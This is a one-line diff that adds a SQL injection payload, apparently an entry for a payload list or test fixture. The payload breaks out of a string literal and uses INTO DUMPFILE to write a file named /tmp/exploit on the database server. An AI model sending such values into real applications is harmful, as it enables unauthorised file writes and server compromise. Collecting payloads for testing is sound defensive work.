@@ -1,0 +1,1 @@
+'; INTO DUMPFILE '/tmp/exploit'--
